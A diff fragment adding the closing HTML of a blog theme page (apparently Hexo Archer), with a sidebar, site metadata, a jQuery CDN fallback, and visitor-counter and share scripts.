+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "qiqing"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
